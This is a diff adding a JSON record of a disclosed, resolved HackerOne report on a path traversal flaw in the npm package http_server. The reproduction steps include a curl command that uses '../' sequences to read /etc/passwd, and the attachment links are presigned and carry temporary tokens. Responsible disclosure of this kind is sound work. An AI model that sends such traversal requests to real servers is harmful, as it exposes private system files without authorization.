@@ -1,0 +1,144 @@
+{
+  "id": 579523,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81Nzk1MjM=",
+  "url": "https://hackerone.com/reports/579523",
+  "title": "[http_server] Path Traversal allowing to read any files on the server",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-05-13T20:26:37.821Z",
+  "submitted_at": "2019-05-13T20:26:37.821Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lightangel1412",
+    "url": "/lightangel1412",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4oZAFX28euZbstNbBZuSRAvH/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-09-24T19:21:03.956Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2020-08-25T19:20:39.458Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report path traversal vulnerability in module \"http_server\"\nIt allows an attacker to read any files even system files via this path traversal vulnerability.\n\n# Module\n\nmodule name: http_server\nversion: 1.0.12\nnpm page: https://www.npmjs.com/package/http_server\n\n# Module Description\n一个静态服务器 means \"a static server\"\n\n# Module Stats\n[14] downloads in the last week\n[116] downloads in the last month\n\n# Vulnerability\n\n##Vulnerability Description\nPath traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files.\n\n##Steps To Reproduce:\n- Install the module\n```\nnpm install -g http_server\n```\n\n- Run 'http_server in \"~/Desktop\" directory :\n```\nroot@kali:~/Desktop# http_server\nserver running is :http://localhost:8888\n```\n{F489688}\n\n- Use cURL to access etc/passwd file:\n```\n$ curl --path-as-is --url 'http://localhost:8888/../../../../../etc/passwd'\n```\n{F489687}\n\n##Patch\nUser input should be properly sanitized and filtered to remove dot-dot-slash (../)” sequences and its variations in path. \n\n##Supporting Material/References:\n- Linux kali 4.15.0-kali2-amd64\n- node 10.15.3\n- npm 6.9\n- Firefox ESR 52.7.3 (64-bit)\n\n##Wrap up\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nIt could have enabled an attacker to view system files and leverage attacks like remote code execution and so on.",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 489687,
+      "file_name": "http_server_-_PathTraversal.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/489/687/702cdee80be3d6392ae0e29aca2ad0e8df4ea79e/http_server_-_PathTraversal.PNG?response-content-disposition=attachment%3B%20filename%3D%22http_server_-_PathTraversal.PNG%22%3B%20filename%2A%3DUTF-8%27%27http_server_-_PathTraversal.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZTAGCJRT%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151725Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB0aCXVzLXdlc3QtMiJIMEYCIQDPU%2FztfhwrBklF0YLHpyKWtyZA6IDPHUl3WIYuhDqa%2BQIhAMEzshLL7rsxhI1ngl1SqCcsqw%2FXwR7Syk9SLVJWVPrlKroFCOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgydwDjR74QaMnn2wOwqjgXXmz8jk3YnL%2Bxz7vVe0pX3%2FsR9qKewdgKC%2BrwGgp7DAmP4N6508c8XooOUxpTcv1hN7wODXU3Yu10JUrvr491SPf%2BsRIDNjnmdpB2GdLRvybs0hs3xu%2FQaPEPqAnqZF6dKS4Dzs7MPWfjxFotjudNrNBjA7S7WpbYDu%2BnA0e9fHurBPXNZDz7lfaYD9UWWK5skfwwo5lR9gP21VHcTNXX0Kl8PF%2BYszI8ziXGb9lryaCQI5vECgRluMjq3SRXi%2BbKbj9dV9R5ct4beQw4Wf0tuUNSKAHoqPEQwozMgX3VVylfPMqNN%2BJhf4dwZ2RenYw3jp%2BUe0snfeAAlDGCZ3GHfb%2B0EK1goA0S%2B3JdY1M0Gjb6ZnBBMlLfJmTYwieDIrDhLa5vph%2Fin3q%2FodkQlR7UtCOryYLyAQ%2FwwO0VafFpTk1p00IYlJyfRse6tlpma2L4QzhZRKytL5cHjXAEBijUzM1TUfsYXoWJKFMrspERWITCH99KAPHFDfShCSNJuSkTftPEe2e8He1m0AGdDbEdsWz8PZktU4jjNYVfXcWRicHqzi1iaN6ilVk9JzP1VdCW54cXXDqMDd1nBvyGBZYoeH%2F%2FLzB%2BHI%2BDd4mMELSlf57nG9mE35SFEVkpqBwCccmmZPSTN7iyIOt0nre%2BvvV0YJ71LzYKMoFDDmLH1PF2bJ0z0EzoIBiIrUz9uiNjEjxVa3iqN4ntxYhWSL%2BODKo3dP9wmX65QG%2B1OaynRRALU22rltT%2FQTUM%2FrpROrjwJZ7l5RfF0OTW9JNttaMo%2Br%2FfTqus%2BqBycV%2Bpta4Q4394YfUuP9Z4TAeJ%2BIFPkzzN8tNdGcvftOKFGV3cuNW%2F8AqHJFlSNbrFykb7F0B7L8OMw%2FOH8zwY6sAGVIVsuSAYyueYlzSFK5olCllGuHGTR31mbMn%2BagxNr%2BUHhssl3Nwcbh%2FvOBY9dJb%2FPaHd72s1FvZFDs3CEgbqSY6Pd22aQ3leKQPv1UPUvS5J7vOx4l40Tp095enGBWlqimhhJfdsTWx68bJN7uyxLT0r%2FOXXZEum9orTn9VSKNSPq2MHjeAIo4J9qL1BmhajdjG1xBjuQhnkep2icH3JU%2BYX1CnQjcweCcgT9hUkxCQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f005a2f68187b9567282bde41f3f9a9496d90379a009a5bed2ebee6a94d18a71",
+      "file_size": 29174,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 489688,
+      "file_name": "http_server_-_PathTraversal_0.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/489/688/ec37253df0a1a4bc8726af662d8928ad00397eb4/http_server_-_PathTraversal_0.PNG?response-content-disposition=attachment%3B%20filename%3D%22http_server_-_PathTraversal_0.PNG%22%3B%20filename%2A%3DUTF-8%27%27http_server_-_PathTraversal_0.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZTAGCJRT%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151725Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB0aCXVzLXdlc3QtMiJIMEYCIQDPU%2FztfhwrBklF0YLHpyKWtyZA6IDPHUl3WIYuhDqa%2BQIhAMEzshLL7rsxhI1ngl1SqCcsqw%2FXwR7Syk9SLVJWVPrlKroFCOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgydwDjR74QaMnn2wOwqjgXXmz8jk3YnL%2Bxz7vVe0pX3%2FsR9qKewdgKC%2BrwGgp7DAmP4N6508c8XooOUxpTcv1hN7wODXU3Yu10JUrvr491SPf%2BsRIDNjnmdpB2GdLRvybs0hs3xu%2FQaPEPqAnqZF6dKS4Dzs7MPWfjxFotjudNrNBjA7S7WpbYDu%2BnA0e9fHurBPXNZDz7lfaYD9UWWK5skfwwo5lR9gP21VHcTNXX0Kl8PF%2BYszI8ziXGb9lryaCQI5vECgRluMjq3SRXi%2BbKbj9dV9R5ct4beQw4Wf0tuUNSKAHoqPEQwozMgX3VVylfPMqNN%2BJhf4dwZ2RenYw3jp%2BUe0snfeAAlDGCZ3GHfb%2B0EK1goA0S%2B3JdY1M0Gjb6ZnBBMlLfJmTYwieDIrDhLa5vph%2Fin3q%2FodkQlR7UtCOryYLyAQ%2FwwO0VafFpTk1p00IYlJyfRse6tlpma2L4QzhZRKytL5cHjXAEBijUzM1TUfsYXoWJKFMrspERWITCH99KAPHFDfShCSNJuSkTftPEe2e8He1m0AGdDbEdsWz8PZktU4jjNYVfXcWRicHqzi1iaN6ilVk9JzP1VdCW54cXXDqMDd1nBvyGBZYoeH%2F%2FLzB%2BHI%2BDd4mMELSlf57nG9mE35SFEVkpqBwCccmmZPSTN7iyIOt0nre%2BvvV0YJ71LzYKMoFDDmLH1PF2bJ0z0EzoIBiIrUz9uiNjEjxVa3iqN4ntxYhWSL%2BODKo3dP9wmX65QG%2B1OaynRRALU22rltT%2FQTUM%2FrpROrjwJZ7l5RfF0OTW9JNttaMo%2Br%2FfTqus%2BqBycV%2Bpta4Q4394YfUuP9Z4TAeJ%2BIFPkzzN8tNdGcvftOKFGV3cuNW%2F8AqHJFlSNbrFykb7F0B7L8OMw%2FOH8zwY6sAGVIVsuSAYyueYlzSFK5olCllGuHGTR31mbMn%2BagxNr%2BUHhssl3Nwcbh%2FvOBY9dJb%2FPaHd72s1FvZFDs3CEgbqSY6Pd22aQ3leKQPv1UPUvS5J7vOx4l40Tp095enGBWlqimhhJfdsTWx68bJN7uyxLT0r%2FOXXZEum9orTn9VSKNSPq2MHjeAIo4J9qL1BmhajdjG1xBjuQhnkep2icH3JU%2BYX1CnQjcweCcgT9hUkxCQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=72d1e7e499afd486933178018b9a8d650f415c6183be917ab53f60f278cf6770",
+      "file_size": 5345,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-09-24T19:20:39.588Z",
+  "allow_singular_disclosure_after": -177364606.31435224,
+  "singular_disclosure_allowed": true,
+  "vote_count": 2,
+  "voters": [
+    "thaivu",
+    "ewindu"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.5,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 2986,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Other module",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
